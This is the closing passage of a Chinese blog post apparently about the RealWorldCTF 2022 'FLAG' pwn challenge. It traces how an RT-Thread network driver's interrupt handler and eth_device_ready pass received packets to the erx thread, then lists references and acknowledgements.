<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">smc911x_isr</span><span class="params">(<span class="keyword">int</span> <span class="built_in">vector</span>, <span class="keyword">void</span> *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eth_device_smc911x</span> *<span class="title">emac</span>;</span></span><br><span class="line"></span><br><span class="line">    emac = SMC911X_EMAC_DEVICE(param);</span><br><span class="line"></span><br><span class="line">    status = smc911x_reg_read(emac, LAN9118_INT_STS);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status &amp; LAN9118_INT_STS_RSFL)</span><br><span class="line">    &#123;</span><br><span class="line">        eth_device_ready(&amp;emac-&gt;parent);</span><br><span class="line">    &#125;</span><br><span class="line">    smc911x_reg_write(emac, LAN9118_INT_STS, status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而 <code>eth_device_ready</code> 函数会发送邮件给 erx 线程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">rt_err_t</span> <span class="title">eth_device_ready</span><span class="params">(struct eth_device* dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;netif)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(dev-&gt;rx_notice == RT_FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            dev-&gt;rx_notice = RT_TRUE;</span><br><span class="line">            <span class="comment">// 发送邮件给 erx 线程</span></span><br><span class="line">            <span class="keyword">return</span> rt_mb_send(&amp;eth_rx_thread_mb, (<span class="keyword">rt_ubase_t</span>)dev);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> RT_EOK;</span><br><span class="line">        <span class="comment">/* post message to Ethernet thread */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> -RT_ERROR; <span class="comment">/* netif is not initialized yet, just return. */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，整个流程就全部出来了，正对上了最上面的那个流程图。</p>
<h2 id="八、参考">八、参考</h2>
<ul>
<li><a href="https://www.bilibili.com/video/BV1D3411b7XY" target="_blank" rel="noopener">揭秘VxWorks路由器破解之路 - 长亭 bilibili</a></li>
<li><a href="http://blog.r0b.re/ctf/pwn/arm/iot/goahead/backdoor/2022/01/23/realworldctf-flag.html" target="_blank" rel="noopener">FLAG (PWN 451) RealWorldCTF - Sauercl0ud</a></li>
<li><a href="https://www.rt-thread.org/document/site/#/rt-thread-version/rt-thread-standard/application-note/components/network/an0010-lwip-driver-porting?id=%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E9%A9%B1%E5%8A%A8%E7%A7%BB%E6%A4%8D%E7%AC%94%E8%AE%B0" target="_blank" rel="noopener">网络协议栈驱动移植笔记 - RT-Thread 文档中心</a></li>
<li><a href="http://blog.yanick.site/2021/03/25/os/rt-thread/rt-thread/" target="_blank" rel="noopener">RT-Thread 简明阅读 - Yanick’s Blog</a></li>
<li><a href="https://club.rt-thread.org/ask/question/3392.html" target="_blank" rel="noopener">RTT+LWIP icmp流</a></li>
</ul>
<h2 id="九、鸣谢">九、鸣谢</h2>
<p>特别感谢<strong>呆呆师傅的 FLAG 题解技术分享</strong>。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2022/01/rwctf2022_flag/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2022/02/rwctf2022_hso/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            RWCTF2022 Pwn 笔记3 - hso groupie Writeup
          
        </div>
      </a>
    
    
      <a href="/2022/01/rwctf2022_qws/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">RWCTF2022 Pwn 笔记1</div>
      </a>
    
  </nav>

   
 
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">


<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>


<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '5f6c407f4cb8963d03ac',
    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
    repo: 'kiprey.github.io',
    owner: 'kiprey',
    admin: ['kiprey'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2020-2025
        <i class="ri-heart-fill heart_icon"></i> Kiprey
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                var int1 = setInterval(fixCount1, 100);
                var int2 = setInterval(fixCount2, 100);

                var busuanziValueSiteOffset = 100000000000;
                var busuanziValuePageOffset = 200000000000;
                function fixCount1() {
                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
                        clearInterval(int1);
                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
                    }
                }
                function fixCount2() {
                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
                        clearInterval(int2);
                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
                    }
                }
            });
        </script> -->
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true
  }
</script>

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->


<script src="/js/clickBoom2.js"></script>


<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>


<!-- mermaid -->

  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({theme: 'forest'});
    }
  </script>

<!-- baiduSpider auto push -->

  <script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https'){
       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else{
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
    </script>


    
  </div>
</body>

</html>